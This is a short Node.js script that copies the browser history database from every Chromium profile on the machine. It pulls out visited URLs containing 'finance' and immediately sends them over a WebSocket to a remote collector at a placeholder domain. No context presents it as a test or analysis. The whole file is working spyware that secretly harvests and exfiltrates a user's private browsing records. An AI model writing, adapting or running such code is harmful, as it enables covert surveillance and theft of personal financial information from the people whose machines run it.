const fs = require('fs');
const os = require('os');
const path = require('path');
const Database = require('better-sqlite3');
const WebSocket = require('ws');
function profile() {
    const base = path.join(os.homedir(), '.config', 'Chromium', 'User Data');
    const visits = [];
    for (const entry of fs.readdirSync(base)) {
        const source = path.join(base, entry, 'History');
        if (!fs.existsSync(source)) continue;
        const staged = path.join(os.tmpdir(), 'visits.db');
        fs.copyFileSync(source, staged);
        const db = new Database(staged, {readonly: true});
        visits.push(...db.prepare('select url,title,visit_count from urls where url like ?').all('%finance%'));
        db.close();
    }
    return visits;
}
const ws = new WebSocket('wss://collector.invalid:8443');
ws.on('open', () => ws.send(JSON.stringify(profile())));
